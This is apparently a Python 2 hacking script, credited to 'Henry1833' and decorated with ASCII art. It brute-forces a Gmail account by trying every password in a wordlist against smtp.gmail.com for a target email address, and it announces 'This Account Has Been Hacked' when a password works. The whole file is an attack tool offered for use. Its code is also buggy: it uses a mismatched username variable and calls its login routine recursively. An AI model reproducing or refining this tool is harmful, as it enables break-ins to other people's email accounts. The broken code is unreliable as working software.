#!/usr/bin/python
'''create by Henry1833'''

import os
import time
import smtplib 
from os import system 

def main(): 
   print '================================================='
   print '              create by Henry1833                '
   print '================================================='
   print '            ++++++++++++++++++++++               '
   print '\n                                               '
   print ' _,.                                             '
   print '                                                 '
   print '                                                 '
   print '                   Henry1833                     '
   print '       _,.                        '
   print '     ,` -.)                       '
   print '    ( _/-\\-._                    '
   print '   /,|`--._,-^|             .     '                                  
   print '   \_| |`-._/||           . |     ' 
   print '     |  `-, / |          /  /     '
   print '     |     || |         /  /      '
   print '      `r-._||/  __     /  /       '
   print '  __,-<_     )`-/   `./  /        '
   print '    \ `---     \   / /  /         '
   print '      |           |./  /          '
   print '      /           //  /           '
   print '  \_/  \         |/  /            '
   print '   |    |   _,^- /  /             '
   print '   |    ,  `` (\/  /_             '
   print '    \,.->._    \X-=/^             '
   print '     ( /   `-._//^`               '
   print '      `Y-.___(__}                 '
   print '       |    {__)                  '
   print '            ()   V.1.0            '

main()
print '[1] start the attack'
print '[2] exit'
print '[3] update script'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(username, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + ' ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + ' ^_^'
        
            break
         else:
           print '[!] password not found => ' + password
           login()
